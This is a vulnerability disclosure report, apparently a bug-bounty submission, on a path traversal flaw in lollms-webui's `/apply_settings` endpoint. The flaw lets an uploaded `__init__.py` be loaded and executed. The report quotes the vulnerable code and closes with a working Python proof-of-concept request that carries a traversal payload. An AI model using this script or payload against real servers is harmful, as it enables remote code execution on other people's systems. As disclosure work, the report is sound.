# Description

In `/home/retr0/Downloads/lollms-webui-clone/lollms_core/lollms/server/endpoints/lollms_configuration_infos.py`'s `/apply_settings` user can save their settings for their `lollms` 

However, **path traversal allows users to cd to Arbitrary directory, which the server further loads the `__init__.py` file, causing Arbitrary Code Execution**.

## Duplication?

Furthermore, this is not duplication of https://huntr.com/bounties/3fcc053c-7b41-40f0-a118-b6bfa5019e38/ Since the vulnerability is not caused by the `ExtensionBuilder`class itself, which should be loading pre-set paths, but by the method called here not sanitizing the path input.

# PoC

In `./lollms-webui-clone/lollms_core/lollms/server/endpoints/lollms_configuration_infos.py` `/save_settings`

```python
@router.post("/apply_settings")
async def apply_settings(request: Request):
    """
    Endpoint to apply configuration settings.

    :param request: The HTTP request object.
    :return: A JSON response with the status of the operation.
    """

    try:
        config_data = await request.json()
        config = config_data["config"]
        try:
            for key in lollmsElfServer.config.config.keys():
                lollmsElfServer.config.config[key] = config.get(key, lollmsElfServer.config.config[key])
            ASCIIColors.success("OK")
            lollmsElfServer.rebuild_personalities()
            if lollmsElfServer.config.auto_save:
                lollmsElfServer.config.save_config()
            return {"status":True}
        except Exception as ex:
            trace_exception(ex)
            return {"status":False,"error":str(ex)}
    except Exception as ex:
        trace_exception(ex)
        lollmsElfServer.error(ex)
        return {"status":False,"error":str(ex)}
```

The server use this endpoint to apply user's setting on their `lollmsElfServer.config.config` via the `config_data["config"]`, it will first traverse the `lollmsElfServer.config.config.keys()` and set each key of `lollmsElfServer.config.config[key]` in to the corresponding  `config.get(key, lollmsElfServer.config.config[key])`. However, since this endpoint did not preform any sort of Path traversal checks like `setting_value = sanitize_path(config_data["setting_value"]) `used in the brother `@router.post("/update_setting")`, the user can insert payloads that includes `../../../`(relative path), cause setting key to any arbitrary location.

Now lets take a look into `class ExtensionBuilder`：

```python
lass ExtensionBuilder:
    def build_extension(
                        self, 
                        extension_path:str, 
                        lollms_paths:LollmsPaths,
                        app,
                        installation_option:InstallOption=InstallOption.INSTALL_IF_NECESSARY
                    )->LOLLMSExtension:

        extension, script_path = self.getExtension(extension_path, lollms_paths, app)
        return extension(app = app, installation_option = installation_option)
    
    def getExtension(
                        self, 
                        extension_path:str, 
                        lollms_paths:LollmsPaths,
                        app
                    )->LOLLMSExtension:
        
        extension_path = lollms_paths.extensions_zoo_path / extension_path

        # define the full absolute path to the module
        absolute_path = extension_path.resolve()
        # infer the module name from the file path
        module_name = extension_path.stem
        # use importlib to load the module from the file path
        loader = importlib.machinery.SourceFileLoader(module_name, str(absolute_path / "__init__.py"))
        extension_module = loader.load_module()
        extension:LOLLMSExtension = getattr(extension_module, extension_module.extension_name)
        return extension, absolute_path
```

As we can see, this part of code firstly defines a class named `ExtensionBuilder` for building and loading external extensions. The `build_extension` method takes an extension path, a `LollmsPaths` instance, an application instance, and an installation option (default is to install when necessary), and returns a configured extension instance. The `getExtension` method is responsible for loading and returning an extension class (`LOLLMSExtension`) and script path, given an extension path and application instance. Specifically, it dynamically loads a module using `importlib` by parsing the extension path and retrieves a specified extension class instance from it.

However, as we see here, the server directly concat `lollms_paths.extensions_zoo_path / extension_path` to generate the `extension_path` and loads `extension_path.resolve() / "__init__.py"` directly via `importlib.machinery.SourceFileLoader`. In which `extension_path` is vulnerable to path traversal. 

Thus, if we change `"extensions",` in to a list that contains a path-traversing payload to a location that we can upload `py` files(in this case can be our `upload directory for each dicussions`). The server will consequently loads the `__init__.py` can cause it to execute arbitrary codes `like os.system` and even creating a reverse-shell connection.

# Exploiting

the exploiting method is similar to the [This report](https://huntr.com/bounties/3fcc053c-7b41-40f0-a118-b6bfa5019e38/) I submit. It only differs when changing the `extensions`, you may use this script to send a request to `apply_settings`

```python
import requests

def ApplySettings(
    url = "http://localhost:9600",
    path = "../personal_data/discussion_databases/4/text_data",
):
    body = {
        "config":{
            "extensions":[
                path
            ],
            }
        }
    return requests.post(
        f"{url}/apply_settings",
        json=body,
    )

ApplySettings()
```
